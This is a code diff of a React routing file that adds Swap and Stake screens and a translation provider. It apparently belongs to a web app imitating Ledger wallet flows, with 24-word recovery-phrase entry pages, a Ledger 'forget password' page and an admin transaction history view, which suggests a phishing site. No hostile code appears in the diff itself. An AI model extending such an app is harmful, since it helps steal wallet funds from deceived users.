@@ -13,6 +13,8 @@ import Send from "./components/Screens/Send";
 import Receive from "./components/Screens/Receive";
 import Manager from "./components/Screens/Manager";
 import Settings from "./components/Screens/Settings";
+import Swap from "./components/Screens/Swap";
+import Stake from "./components/Screens/Stake";
 import AdminTransactionHistory from "./components/Screens/AdminTransactionHistory";
 import ProtectedRoute from "./components/loginProcess/ProtectedRoute";
 
@@ -46,6 +48,7 @@ import ForgetPasswordLedger from "./components/popups/ForgetPasswordLedger";
 import Recover_24_Nano_X from "./components/loginProcess/allDevices_subsection/nano-x-subsection/Recover_24_NanoX";
 import LedgerRegister from "./components/popups/LedgerRegister";
 import { DarkModeProvider } from "./components/DarkModeContext";
+import { TranslationProvider } from "./contexts/TranslationContext";
 
 function AppContent() {
   const location = useLocation();
@@ -64,194 +67,224 @@ function AppContent() {
     else setCurrentScreen("portfolio");
   }, [location]);
 
+  // ...
+
   return (
     <div className="min-h-screen bg-gray-950 dark">
       <DarkModeProvider>
-        <Routes>
-          {/* Public Routes */}
-          <Route path="/" element={<Login1 />} />
-          <Route path="/login" element={<LedgerRecover />} />
-          <Route path="/register" element={<LedgerRegister />} />
+        <TranslationProvider>
+          <Routes>
+            {/* Public Routes */}
+            <Route path="/" element={<Login1 />} />
+            <Route path="/login" element={<LedgerRecover />} />
+            <Route path="/register" element={<LedgerRegister />} />
 
-          {/* Device Selection Routes */}
-          <Route path="/all-devices" element={<AllDevices />} />
-          <Route path="/all-devices/ledger-stax" element={<Ledger_Stax />} />
-          <Route path="/all-devices/ledger-flex" element={<Ledger_Flex />} />
-          <Route
-            path="/all-devices/ledger-nano-s"
-            element={<Ledger_Nano_S />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s-plus"
-            element={<Ledger_Nano_S_Plus />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-x"
-            element={<Ledger_Nano_X />}
-          />
+            {/* Device Selection Routes */}
+            <Route path="/all-devices" element={<AllDevices />} />
+            <Route path="/all-devices/ledger-stax" element={<Ledger_Stax />} />
+            <Route path="/all-devices/ledger-flex" element={<Ledger_Flex />} />
+            <Route
+              path="/all-devices/ledger-nano-s"
+              element={<Ledger_Nano_S />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s-plus"
+              element={<Ledger_Nano_S_Plus />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-x"
+              element={<Ledger_Nano_X />}
+            />
 
-          {/* Nano-S Routes */}
-          <Route
-            path="/all-devices/ledger-nano-s/first-time-nano-s"
-            element={<First_Time_Nano_S />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s/connect-nano-s"
-            element={<Connect_Nano_S />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s/restore-recovery-nano-s"
-            element={<Restore_Recovery_Nano_S />}
-          />
+            {/* Nano-S Routes */}
+            <Route
+              path="/all-devices/ledger-nano-s/first-time-nano-s"
+              element={<First_Time_Nano_S />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s/connect-nano-s"
+              element={<Connect_Nano_S />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s/restore-recovery-nano-s"
+              element={<Restore_Recovery_Nano_S />}
+            />
 
-          {/* Nano-S-Plus Routes */}
-          <Route
-            path="/all-devices/ledger-nano-s-plus/first-time-nano-s-plus"
-            element={<First_Time_Nano_S_Plus />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s-plus/connect-nano-s-plus"
-            element={<Connect_Nano_S_Plus />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s-plus/restore-recovery-nano-s-plus"
-            element={<Restore_Recovery_Nano_S_Plus />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus"
-            element={<Recover_24 />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus/forget-password"
-            element={<ForgetPasswordLedger />}
-          />
+            {/* Nano-S-Plus Routes */}
+            <Route
+              path="/all-devices/ledger-nano-s-plus/first-time-nano-s-plus"
+              element={<First_Time_Nano_S_Plus />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s-plus/connect-nano-s-plus"
+              element={<Connect_Nano_S_Plus />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s-plus/restore-recovery-nano-s-plus"
+              element={<Restore_Recovery_Nano_S_Plus />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus"
+              element={<Recover_24 />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-s-plus/restore-24-nano-s-plus/forget-password"
+              element={<ForgetPasswordLedger />}
+            />
 
-          {/* Nano-X Routes */}
-          <Route
-            path="/all-devices/ledger-nano-x/first-time-nano-x"
-            element={<First_Time_Nano_X />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-x/connect-nano-x"
-            element={<Connect_Nano_X />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-x/restore-recovery-nano-x"
-            element={<Restore_Recovery_Nano_X />}
-          />
-          <Route
-            path="/all-devices/ledger-nano-x/restore-24-nano-x"
-            element={<Recover_24_Nano_X />}
-          />
+            {/* Nano-X Routes */}
+            <Route
+              path="/all-devices/ledger-nano-x/first-time-nano-x"
+              element={<First_Time_Nano_X />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-x/connect-nano-x"
+              element={<Connect_Nano_X />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-x/restore-recovery-nano-x"
+              element={<Restore_Recovery_Nano_X />}
+            />
+            <Route
+              path="/all-devices/ledger-nano-x/restore-24-nano-x"
+              element={<Recover_24_Nano_X />}
+            />
 
-          {/* Onboarding Routes */}
-          <Route path="/onboarding-welcome" element={<Welcome />} />
-          <Route
-            path="/onboarding/device-connection"
-            element={<DeviceConnection />}
-          />
-          <Route
-            path="/onboarding/account-import"
-            element={<AccountImport />}
-          />
-          <Route path="/onboarding/app-setup" element={<AppSetup />} />
+            {/* Onboarding Routes */}
+            <Route path="/onboarding-welcome" element={<Welcome />} />
+            <Route
+              path="/onboarding/device-connection"
+              element={<DeviceConnection />}
+            />
+            <Route
+              path="/onboarding/account-import"
+              element={<AccountImport />}
+            />
+            <Route path="/onboarding/app-setup" element={<AppSetup />} />
 
-          {/* Protected Main App Routes */}
-          <Route
-            path="/dashboard"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Dashboard />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/accounts"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Accounts />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/send"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Send />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/receive"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Receive />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/manager"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Manager />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/settings"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <Settings />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
-          <Route
-            path="/admin-transactions"
-            element={
-              <ProtectedRoute>
-                <MainLayout
-                  currentScreen={currentScreen}
-                  onScreenChange={setCurrentScreen}
-                >
-                  <AdminTransactionHistory />
-                </MainLayout>
-              </ProtectedRoute>
-            }
-          />
+            {/* Protected Main App Routes */}
+            <Route
+              path="/dashboard"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Dashboard />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/accounts"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Accounts />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/send"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Send />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/receive"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Receive />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/manager"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Manager />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/settings"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Settings />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/admin-transactions"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <AdminTransactionHistory />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/swap"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Swap />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
+            <Route
+              path="/stake"
+              element={
+                <ProtectedRoute>
+                  <MainLayout
+                    currentScreen={currentScreen}
+                    onScreenChange={setCurrentScreen}
+                  >
+                    <Stake />
+                  </MainLayout>
+                </ProtectedRoute>
+              }
+            />
 
-          {/* Catch all - redirect to login */}
-          <Route path="*" element={<Navigate to="/login" replace />} />
-        </Routes>
+            {/* Catch all - redirect to login */}
+            <Route path="*" element={<Navigate to="/login" replace />} />
+          </Routes>
+        </TranslationProvider>
       </DarkModeProvider>
     </div>
   );
